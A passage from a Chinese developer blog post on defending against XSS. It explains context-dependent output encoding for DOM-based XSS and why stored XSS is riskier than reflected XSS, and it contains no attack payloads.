<h3 id="3.3.6%E9%98%B2%E5%BE%A1DOM%20Based%20XSS" style="background-color:transparent;">3.3.6防御DOM Based XSS</h3> 
<p>在&lt;script&gt;标签执行时，已经对变量进行了一次解码，所以其后再将变量输出到HTML界面时，需要再进行一次编码。</p> 
<p>从JavaScript输出到HTML界面，也相当于一次XSS输出的过程，需要分语境使用不同的编码函数。</p> 
<p>举例：</p> 
<p><img alt="" height="324" src="https://images2.imgbox.com/53/93/Kl8eU1d4_o.png" width="1200"></p> 
<p> 首先，在“$var”输出到&lt;script&gt;时，应该执行一次javascriptEncode；其次，在document.write输出到html界面时，要分具体情况看待：如果是输出到事件或者脚本，则要再做一次javascriptEncode；如果是输出到html内容或者属性，则要做一次HtmlEncode。</p> 
<p></p> 
<h3 id="3.3.7%E6%8D%A2%E4%B8%AA%E8%A7%92%E5%BA%A6%E7%9C%8BXSS%E7%9A%84%E9%A3%8E%E9%99%A9">3.3.7换个角度看XSS的风险</h3> 
<p>一般来说，存储型XSS的风险会高于反射型XSS。因为存储型XSS会保存在服务器上，有可能会跨页面存在。</p> 
<p>从攻击过程来说，反射型XSS一般要求攻击者诱使用户点击一个包含XSS代码的URL链接；而存储型XSS则只要让用户查看一个正常的URL链接。这样的漏洞极其隐蔽，且埋伏在用户的正常业务中，风险颇高。</p> 
<p></p> 
<h2 id="3.4%E5%B0%8F%E7%BB%93">3.4小结</h2> 
<p>本章讲述了XSS攻击的原理，并从开发者的角度阐述了如何防御XSS。</p> 
<p>在设计XSS解决方案时，应该深入理解XSS攻击的原理，针对不同的场景使用不同的方法。</p>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/b2be0c7175cf6b0fdcc617c2f1a2d2c3/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">西电期末1035.可构造三角形个数</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/329d314dbae04c4fdd0cefa46c2c077c/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">【EAI 006】ChatGPT for Robotics：将 ChatGPT 应用于机器人任务的提示词工程研究</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 菜鸟程序员博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>